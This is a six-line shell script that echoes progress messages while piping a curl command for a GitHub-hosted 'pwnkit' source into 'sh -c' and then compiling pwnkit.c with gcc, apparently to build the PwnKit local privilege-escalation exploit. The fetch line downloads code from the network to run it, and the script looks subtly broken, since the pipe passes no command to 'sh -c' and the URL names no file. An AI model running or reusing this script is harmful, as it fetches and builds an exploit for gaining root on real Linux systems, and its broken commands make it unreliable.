echo "Fetching C source..."
echo "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit" | sh -c
echo "Done."
echo "Creating ecxecutable..."
gcc -o pwnkit pwnkit.c
echo "Done."
